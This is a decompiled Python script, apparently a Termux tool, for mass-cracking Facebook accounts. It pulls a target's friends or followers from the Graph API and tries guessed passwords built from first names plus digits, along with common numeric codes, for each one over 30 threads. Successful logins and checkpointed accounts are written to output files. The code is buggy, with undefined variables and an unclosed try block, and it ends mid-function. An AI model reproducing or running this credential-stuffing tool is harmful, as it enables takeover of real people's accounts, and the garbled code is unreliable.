# Decompiled by RIAZ  | KHAN
#---------------------------------------
# Source File : see.py
# Time : aun jan 14 05:25:01 2022
#---------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: Sazxt
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, platform
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
import binascii, uuid, base64, platform
from getmac import get_mac_address as gma
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/output')
except OSError:
    pass

os.system('git pull')
os.system('clear')
w = '\x1b[1;97m'
g = '\x1b[1;32m'
red = '\x1b[1;91m'
wrong = '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]'
wg = '\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m]'
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
logo = '\x1b[1;91m   ||  ||  \xe2\x94\x8f\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x93\x1b[1;97m\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\x8c\xe2\x94\x80    \x1b[1;91m\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x93\n   \xe2\x95\xb0\xe2\x95\xb0\x1b[1;97m()\x1b[1;91m\xe2\x95\xaf\xe2\x95\xaf   \xe2\x94\x83 \xe2\x94\x83\x1b[1;97m\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xb4\xe2\x94\x90 \xe2\x94\x80\xe2\x94\x80 \x1b[1;91m\xe2\x94\xa3\xe2\x94\xab \xe2\x94\xa3\xe2\x94\xbb\xe2\x94\x93\n  \xe2\x95\xad\xe2\x95\xad\x1b[1;97m(__)\x1b[1;91m\xe2\x95\xae\xe2\x95\xae \xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x9b\x1b[1;97m\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4  \xe2\x94\x94    \x1b[1;91m\xe2\x94\x97  \xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\n  ||    ||   \x1b[47;30;1m    William Jack    \x1b[0;0m'
info = '\n\x1b[1;97m[\x1b[1;32mINFO\x1b[1;97m]\n\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Author   :  RIAZ KHAN\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Github   :  https://github.com/RIAZKILLER\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] WATSAPP :  03188214452\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] FACEBOOK :  https://www.facebook.com/Riaz-hacker-100835532473815/\n\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Encrypt By  : RIAZKHAN\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Support By  : RIAZKHAN\n'


def lout():
    os.system('rm access_token.txt')
    os.system('exit')


def rtrash():
    os.system('rm -rf /sdcard/output')
    os.system('exit')


def info_tools():
    os.system('clear')
    print info
    memew = raw_input(w + '[' + g + '?' + w + '] Press enter to back! ')
    menu()


idh = []
back = 0

def loading():
    os.system('clear')
    titik = ['\x1b[1;31m[\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m]    \x1b[1;90m0% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;94m40% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;95m60% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;96m70% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;93m80% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;37m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;98m90% ', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;92m100%', '\x1b[1;31m[\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;92mSuccess\x1b[1;34m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;31m] \x1b[1;35m100%']
    for o in titik:
        print '\r\x1b[1;37m           [\x1b[1;32m+\x1b[1;37m] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}

def log_menu():
    try:
        tok = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 38 * '-'
        print '\n\x1b[1;97m{\x1b[1;32m1\x1b[1;97m} Login with FaceBook'
        print '\x1b[1;97m{\x1b[1;32m2\x1b[1;97m} Login with Token'
        print '\x1b[1;97m{\x1b[1;91m0\x1b[1;97m} Exit'
        print 38 * '-'
        log_menu_s()


def log_menu_s():
    s = raw_input('\xe2\x9e\x9b ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '0':
        os.system('exit')
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Wrong Input!!!'
        sds = raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press Enter to back! ')
        log_menu()


def log_fb():
    os.system('clear')
    print logo
    print 38 * '-'
    lid = raw_input('\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Email/Username : ')
    pwds = raw_input('\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Password       : ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Account must verify'
            raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back! ')
            log_menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed!'
            raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back! ')
            log_menu()
    except:
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed!'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print 38 * '-'
    token = raw_input('\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Enter Token : \x1b[1;32m')
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        q = json.loads(r.text)
        z = q['name']
        s = open('access_token.txt', 'w')
        s.write(toket)
        s.close()
        print '\x1b[1;92m[\xe2\x9c\x93] Login Success {^_^} '
        os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
        time.sleep(1)
        menu()


def menu():
    os.system('clear')
    try:
        tok = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print logo
        print w + '[' + g + '!' + w + ']' + 'Login FB ID to continue... '
        time.sleep(1)
        log_menu()

    try:
        tok = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Login Failed!'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(2.5)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Conection Failed!'
        os.system('exit')

    os.system('clear')
    print logo
    print 38 * '-'
    tok = open('/data/data/com.termux/files/usr/libexec/awk/.termux.log', 'r').read()
    print w + '\n{' + g + 'INFO' + w + '} Name  : ' + z
    print w + '\n{' + g + '1' + w + '} Crack with Auto Password 10'
    print w + '{' + g + '2' + w + '} Crack with Number password 6'
    print w + '{' + g + '3' + w + '} Crack with Name And Password 8'
    print w + '{' + g + '4' + w + '} Extract File'
    print w + '{' + g + '5' + w + '} Info Tools'
    print '\n\x1b[1;97m{\x1b[1;91m6\x1b[1;97m} Logout'
    print '\x1b[1;97m{\x1b[1;91m7\x1b[1;97m} Delete File Trash'
    menu_s()


def menu_s():
    ms = raw_input(w + '\n\xe2\x9e\x9b ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        ex_id()
    elif ms == '5':
        info_tools()
    elif ms == '6':
        lout()
    elif ms == '7':
        rtrash()
    else:
        print ''
        print wrong + ' Wrong Input'
        time.sleep(1)
        menu()


def crack():
    global toket
    try:
        toket = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print w + '[' + red + '!' + w + '] File Not Found'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + red + '0' + w + '} Back'
    a_s()


def auto_crack():
    global token
    try:
        toket = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print w + '[' + g + '!' + w + '] Login With FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + g + '0' + w + '} Back'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input('\xe2\x9e\x9b ')
    if a_s == '1':
        os.system('clear')
        print logo
        print 38 * '-'
        idt = raw_input(w + '[' + g + '>' + w + '] ID  : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\n' + w + '[' + g + '>' + w + '] Cloning From : \x1b[1;32m' + z
        except (KeyError, IOError):
            print w + '[' + red + '!' + w + '] Invalid User!'
            raw_input('\n' + w + '[' + red + '!' + w + '] Press enter to back ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '\n{' + g + '+' + w + '} Example : 123,1234,12345,786,12,1122\x1b[1;91m'
        p1 = raw_input('\n' + w + '[' + g + '1' + w + '] Name + digit : ')
        p2 = raw_input(w + '[' + g + '2' + w + '] Name + digit : ')
        p3 = raw_input(w + '[' + g + '3' + w + '] Name + digit : ')
        p4 = raw_input(w + '[' + g + '4' + w + '] Name + digit : ')
        idt = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print 38 * '-'
            print w + '[' + g + 'INFO' + w + '] Crack From : ' + z
        except (KeyError, IOError):
            print w + '[' + red + '!' + w + '] Invalid User'
            raw_input(w + '[' + red + '!' + w + '] Press enter to back!  ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print 38 * '-'
        try:
            idlist = raw_input('\n' + w + '[' + g + 'INPUT' + w + '] Input File  : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\n' + w + '[' + red + '!' + w + '] File not Found!'
            raw_input('\n' + w + '[' + red + '!' + w + '] Press enter to back! ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print w + '[' + red + '!' + w + '] Wrong Input'
        bnxx = raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
        auto_crack()
    print w + '\n[' + g + '\xe2\x9e\x9b' + w + '] Total ID  : ' + str(len(id))
    time.sleep(0.5)
    print w + '[' + red + '\xe2\x80\xa2' + w + '] Crack Running '
    time.sleep(0.5)
    print 38 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/output/dark_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass1
                cp = open('dark_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass2
                    cp = open('dark_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/output/dark_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass3
                        cp = open('dark_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/output/dark_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass4
                            cp = open('dark_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/output/dark_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass5
                                cp = open('dark_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass6
                                    cp = open('dark_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/output/dark_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass7
                                        cp = open('dark_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/output/dark_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass8
                                            cp = open('dark_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '000786'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/output/dark_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass9
                                                cp = open('dark_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass10
                                                    cp = open('dark_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 38 * '-'
    print w + '\n[' + g + '\xe2\x9c\x94' + w + '] Crack Done'
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cps))
    raw_input('\n' + w + '[' + g + '?' + w + '] Press enter to crack again! ')
    auto_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print w + '[' + red + '!' + w + '] File not Found!'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + red + '0' + w + '} Back'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + red + '0' + w + '} Back'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(w + '\n\xe2\x9e\x9b ')
    if a_s == '1':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '[' + g + '+' + w + '] Example : 234567,223344,334455,445566'
        pass1 = raw_input('\n' + w + '[' + g + '1' + w + '] Password : ')
        pass2 = raw_input(w + '[' + g + '2' + w + '] Password : ')
        pass3 = raw_input(w + '[' + g + '3' + w + '] Password : ')
        pass4 = raw_input(w + '[' + g + '4' + w + '] Password : ')
        pass5 = raw_input(w + '[' + g + '5' + w + '] Password : ')
        pass6 = raw_input(w + '[' + g + '6' + w + '] Password : ')
        idt = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print 38 * '-'
            print '\n' + w + '[' + g + 'USER' + w + '] Cloning From : ' + z + '\n'
        except (KeyError, IOError):
            print '\n' + w + '[' + red + '!' + w + '] Invalid User! '
            raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '\n{' + g + '+' + w + '} Example : 234567,223344,334455,445566\n'
        pass1 = raw_input(w + '[' + g + '1' + w + '] Password : ')
        pass2 = raw_input(w + '[' + g + '2' + w + '] Password : ')
        pass3 = raw_input(w + '[' + g + '3' + w + '] Password : ')
        pass4 = raw_input(w + '[' + g + '4' + w + '] Password : ')
        idt = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print 38 * '-'
            print '\n' + w + '[' + g + 'USER' + w + '] Cloning From : ' + z
        except (KeyError, IOError):
            print w + '[' + red + '!' + w + '] Invalid User! '
            raw_input(w + '[' + g + '!' + w + '] Press enter to back! ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '[' + g + '+' + w + '] Example : 234567,223344,334455,445566'
        pass1 = raw_input('\n' + w + '[' + g + '1' + w + '] Password : ')
        pass2 = raw_input(w + '[' + g + '2' + w + '] Password : ')
        pass3 = raw_input(w + '[' + g + '3' + w + '] Password : ')
        pass4 = raw_input(w + '[' + g + '4' + w + '] Password : ')
        pass5 = raw_input(w + '[' + g + '5' + w + '] Password : ')
        pass6 = raw_input(w + '[' + g + '6' + w + '] Password : ')
        try:
            idlist = raw_input('\n' + w + '[' + g + 'INPUT' + w + '] Input File : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\n' + w + '[' + red + '!' + w + '] File not Found!'
            raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print w + '[' + red + '!' + w + '] Wrong input! '
        time.sleep(1)
        choice_crack()
    print '\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Total ID : \x1b[1;32m' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Crack Running...'
    time.sleep(0.5)
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/output/dark_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
